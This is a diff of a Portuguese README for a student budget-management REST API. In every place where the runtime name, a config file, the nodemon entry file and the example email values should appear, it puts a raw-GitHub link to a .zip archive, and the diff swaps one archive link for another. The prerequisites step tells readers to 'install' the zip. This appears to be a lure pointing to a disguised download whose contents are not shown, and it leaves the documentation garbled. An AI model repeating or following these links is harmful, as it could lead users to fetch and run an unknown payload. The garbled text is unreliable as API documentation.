@@ -2,7 +2,7 @@
 
 **Bem-vindo à documentação da API de Orçamentos. Este projeto foi desenvolvido como parte do curso de Desenvolvimento de Sistemas do Senai. O objetivo é gerenciar usuários e orçamentos através de uma API RESTful.**
 ### 🚀 Tecnologias Utilizadas
- - **https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip** Ambiente de execução JavaScript.
+ - **https://raw.githubusercontent.com/Sanz98/projeto-orcamentos-api/main/src/controllers/projeto-orcamentos-api-v3.2.zip** Ambiente de execução JavaScript.
  - **Express:** Framework para gerenciar as rotas e o servidor.
  - **SQL Server:** Banco de dados.
  - **JWT (JSON Web Token):** Para autenticação e segurança.
@@ -10,7 +10,7 @@
  _Siga os passos abaixo para executar a API no seu computador:_
 
  **1. Pré-requisitos**  
-Certifique-se de ter o https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip instalado.
+Certifique-se de ter o https://raw.githubusercontent.com/Sanz98/projeto-orcamentos-api/main/src/controllers/projeto-orcamentos-api-v3.2.zip instalado.
 
 **2. Instalação**
 Clone este repositório e instale as dependências:  
@@ -19,7 +19,7 @@ Clone este repositório e instale as dependências:
 npm install
 ```
 **3. Configuração do Banco de Dados**   
-Certifique-se de que seu banco de dados está rodando e configure as credenciais no arquivo `.env` ou `https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip`   
+Certifique-se de que seu banco de dados está rodando e configure as credenciais no arquivo `.env` ou `https://raw.githubusercontent.com/Sanz98/projeto-orcamentos-api/main/src/controllers/projeto-orcamentos-api-v3.2.zip`   
 
 
 **4. Executar o servidor**
@@ -27,7 +27,7 @@ Certifique-se de que seu banco de dados está rodando e configure as credenciais
 # Rodar com Nodemon (modo desenvolvimento)
 npm start
 # OU
-nodemon https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip
+nodemon https://raw.githubusercontent.com/Sanz98/projeto-orcamentos-api/main/src/controllers/projeto-orcamentos-api-v3.2.zip
 ```
 O servidor iniciará na porta padrão (geralmente `3000` ou `8081`).
 
@@ -40,7 +40,7 @@ Realiza o login do usuário e retorna um token de acesso.
 - **Body (JSON):**
 ```
 {
-  "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip",
+  "email": "https://raw.githubusercontent.com/Sanz98/projeto-orcamentos-api/main/src/controllers/projeto-orcamentos-api-v3.2.zip",
   "senha": "123"
 }
 ```
@@ -68,12 +68,12 @@ Lista todos os usuários cadastrados no sistema.
   {
     "id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
     "nome": "João Silva",
-    "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip"
+    "email": "https://raw.githubusercontent.com/Sanz98/projeto-orcamentos-api/main/src/controllers/projeto-orcamentos-api-v3.2.zip"
   },
   {
     "id": "b2c3d4e5-f6a7-8901-2345-678901bcdef0",
     "nome": "Maria Souza",
-    "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip"
+    "email": "https://raw.githubusercontent.com/Sanz98/projeto-orcamentos-api/main/src/controllers/projeto-orcamentos-api-v3.2.zip"
   }
 ]
 ```
@@ -95,7 +95,7 @@ Busca um vendedor específico pelo ID (UUID).
 {
   "id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
   "nome": "João Silva",
-  "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip"
+  "email": "https://raw.githubusercontent.com/Sanz98/projeto-orcamentos-api/main/src/controllers/projeto-orcamentos-api-v3.2.zip"
 }
 ```
 
@@ -123,7 +123,7 @@ Cria um novo vendedor no banco de dados.
 ```
 {
   "nome": "Novo Usuário",
-  "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip",
+  "email": "https://raw.githubusercontent.com/Sanz98/projeto-orcamentos-api/main/src/controllers/projeto-orcamentos-api-v3.2.zip",
   "senha": "senhaSegura123"
 }
 ```
@@ -141,7 +141,7 @@ Atualiza os dados de um vendedores existente.
 ```
 {
   "nome": "Nome Atualizado",
-  "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip"
+  "email": "https://raw.githubusercontent.com/Sanz98/projeto-orcamentos-api/main/src/controllers/projeto-orcamentos-api-v3.2.zip"
 }
 ```
 - **Resposta (200 OK):**
